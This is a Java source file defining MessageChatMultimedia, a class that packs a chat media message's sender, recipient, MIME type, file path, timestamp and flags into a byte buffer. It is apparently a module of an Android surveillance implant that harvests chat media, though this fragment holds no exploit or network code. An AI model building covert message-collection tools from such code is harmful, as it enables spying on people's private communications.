package com.android.dvci.module;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.provider.MediaStore;

import com.android.dvci.auto.Cfg;
import com.android.dvci.util.ByteArray;
import com.android.dvci.util.Check;
import com.android.dvci.util.DataBuffer;
import com.android.dvci.util.DateTime;
import com.android.dvci.util.WChar;
import com.android.mm.M;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;

/**
 * Created by zad on 05/02/15.
 */
public class MessageChatMultimedia {
	private static final String TAG ="MessageChatMultimedia";
	public static final int SIZE_LIMIT = 1024*1024*5;
	public String cap;
	public String body;
	public Date timestamp;
	public boolean incoming;
	public int programId;
	public int size;
	public String from;
	public String to;
	public String displayFrom;
	public String displayTo;
	public String mime;
	public File file;
	ArrayList<byte[]> items;
	int total_length;

	public MessageChatMultimedia(int programId, Date timestamp, String from, String to, boolean incoming,String mm_media_caption, String mime, File file,int size) {

		this.timestamp = timestamp;
		this.incoming = incoming;
		this.programId = programId;
		this.from = from;
		this.to = to;
		this.displayFrom = from;
		this.displayTo = to;
		this.mime = mime;
		this.file = file;
		this.cap = mm_media_caption;
		this.size = size;
		this.items = new ArrayList<byte[]>();
		this.total_length = 0;
	}

	public MessageChatMultimedia(int programId, Date timestamp, String from, String displayFrom, String to, String displayTo,
	                   String serialized, boolean incoming) {

		this.timestamp = timestamp;
		this.incoming = incoming;
		this.programId = programId;
		this.from = from;
		this.to = to;
		this.displayFrom = displayFrom;
		this.displayTo = displayTo;
		this.items = new ArrayList<byte[]>();
		this.total_length = 0;
	}

	public ArrayList<byte[]> getItems() {
		return items;
	}

	public byte[] getAdditionalData() {

		//final byte[] additionalData = new byte[tlen];

		DateTime datetime = new DateTime(timestamp);
		// TIMESTAMP
		items.add(datetime.getStructTm());
		total_length +=items.get(items.size()-1).length;

		// PROGRAM_TYPE
		items.add(ByteArray.intToByteArray(programId));
		total_length +=items.get(items.size()-1).length;
		// FLAGS
		int incoming = this.incoming ? 0x01 : 0x00;
		if (SIZE_LIMIT < size){
			incoming |= (0x1<<28);
		}
		items.add(ByteArray.intToByteArray(incoming));
		total_length +=items.get(items.size()-1).length;
		// FROM
		items.add(WChar.getBytes(from, true));
		total_length +=items.get(items.size()-1).length;
		// FROM DISPLAY
		items.add(WChar.getBytes(displayFrom, true));
		total_length +=items.get(items.size()-1).length;
		// TO
		items.add(WChar.getBytes(to, true));
		total_length +=items.get(items.size()-1).length;
		// TO DISPLAY
		items.add(WChar.getBytes(displayTo, true));
		total_length +=items.get(items.size()-1).length;
		// MIME
		items.add(WChar.getBytes(mime, true));
		total_length +=items.get(items.size()-1).length;
		// FILENAME
		items.add(WChar.getBytes(file.getAbsolutePath(), true));
		total_length +=items.get(items.size()-1).length;

		byte[] additionalData = new byte[total_length];
		final DataBuffer databuffer = new DataBuffer(additionalData, 0, additionalData.length);
		for (byte[] item : items) {
			databuffer.write(item);
		}
		return additionalData;
	}

}
